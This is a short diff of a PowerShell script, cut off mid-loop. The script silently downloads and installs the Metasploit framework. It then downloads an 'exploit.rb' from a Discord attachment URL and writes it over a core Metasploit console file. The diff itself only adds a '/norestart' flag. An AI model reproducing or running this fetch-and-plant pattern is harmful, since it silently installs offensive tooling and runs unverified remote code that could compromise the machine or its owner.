@@ -1,6 +1,6 @@
 $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("https://windows.metasploit.com/metasploitframework-latest.msi","C:\msf.msi")
-msiexec /i C:\msf.msi /qn
+msiexec /i C:\msf.msi /qn /norestart
 $WebClient.DownloadFile("https://cdn.discordapp.com/attachments/667336365662535680/823167889191731220/exploit.rb","C:\metasploit-framework\embedded\framework\lib\msf\ui\console\command_dispatcher\exploit.rb")
 $i = 360
 do {
